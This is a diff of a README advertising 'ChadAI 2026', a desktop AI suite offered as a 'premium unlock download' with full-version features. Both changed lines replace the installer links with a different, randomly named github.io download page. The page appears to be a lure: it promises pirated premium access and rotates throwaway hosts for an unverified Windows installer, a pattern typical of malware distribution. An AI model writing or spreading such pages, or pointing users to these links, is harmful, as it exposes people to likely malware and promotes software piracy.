@@ -2,7 +2,7 @@
 
 ChadAI 2026 is a powerful, private desktop tool suite designed to supercharge your productivity with an integrated AI assistant. This repository provides access to the ChadAI premium unlock download, giving you full version capabilities with GPT-5 powered features. Experience unlimited access to ChadAI's neural network tools on your Windows 10/11 machine.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-0078d4?style=for-the-badge&logo=windows&logoColor=white)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-0078d4?style=for-the-badge&logo=windows&logoColor=white)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -50,7 +50,7 @@ A: Yes. After installation on the new PC, open ChadAI and go to `Settings > Gene
 
 Get the latest stable release of the ChadAI Desktop Suite from our official download page.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 *Last Updated: July 2026 | Copyright © 2026 ChadAI Development Team*
